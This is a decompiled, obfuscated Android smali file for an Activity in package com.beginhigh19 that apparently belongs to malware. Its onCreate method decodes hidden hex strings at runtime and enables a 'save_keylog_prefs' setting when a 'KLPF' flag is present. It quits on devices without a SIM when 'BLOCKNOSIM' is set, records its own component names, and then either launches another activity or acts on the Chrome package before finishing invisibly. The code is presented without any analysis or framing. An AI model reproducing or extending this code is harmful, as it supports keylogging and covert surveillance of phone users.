.class public Lcom/beginhigh19/p079j;
.super Landroid/app/Activity;
.source "SourceFile"


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4

    const-string v0, "com.android.chrome"

    const-string v1, "4ca7d64339dff7ec5021ba3a5e7d3d0ab0a363"

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    :try_start_0
    sget-object v2, Lfddo/for;->ifdf:Ljava/lang/String;

    const-string v3, "BLOCKNOSIM"

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_0

    invoke-static {p1}, Lfddo/goto;->fddo(Landroid/content/Context;)Z

    move-result v3

    if-nez v3, :cond_0

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void

    :cond_0
    const-string v3, "KLPF"

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_1

    const-string v2, "save_keylog_prefs"

    sget-object v3, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p1, v2, v3}, Lfddo/throw;->case(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    :cond_1
    const-string v2, "5dadd85a33c7f7f07b0caf365051270eafa3"

    invoke-static {v2}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0}, Landroid/app/Activity;->getComponentName()Landroid/content/ComponentName;

    move-result-object v3

    invoke-virtual {v3}, Landroid/content/ComponentName;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-static {p1, v2, v3}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "5dadd85a33c7f7f07b0cbc314451270eafa3"

    invoke-static {v2}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0}, Landroid/app/Activity;->getComponentName()Landroid/content/ComponentName;

    move-result-object v3

    invoke-virtual {v3}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v3

    invoke-static {p1, v2, v3}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "57acc65e3dc5fefb6b0caf36507d"

    invoke-static {v2}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {p1}, Lfddo/goto;->protected(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    invoke-static {p1, v2, v3}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v1}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sget-object v3, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p1, v2, v3}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-nez v2, :cond_2

    invoke-static {p1}, Lfddo/goto;->sartjsrtfjsrfjtsrtjgfhe(Landroid/content/Context;)V

    invoke-static {v1}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    sget-object v2, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p1, v1, v2}, Lfddo/throw;->case(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    :cond_2
    invoke-static {p1}, Lfddo/goto;->y(Landroid/content/Context;)V

    const-string v1, "4daada5d03c8f1ed6d"

    invoke-static {v1}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {p1, v1, v3}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_3

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/beginhigh19/p036o;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    :cond_3
    invoke-static {p1}, Lfddo/goto;->dfhaefdhadfhdfherh(Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_5

    invoke-static {p1, v0}, Lfddo/goto;->strictfp(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_4

    invoke-static {p1, v0}, Lfddo/goto;->e(Landroid/content/Context;Ljava/lang/String;)Z

    :cond_4
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v1, "7b9af67511e8dbd0"

    invoke-static {v1}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {p1, v1, v0}, Lfddo/goto;->class(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_5
    :goto_0
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void
.end method
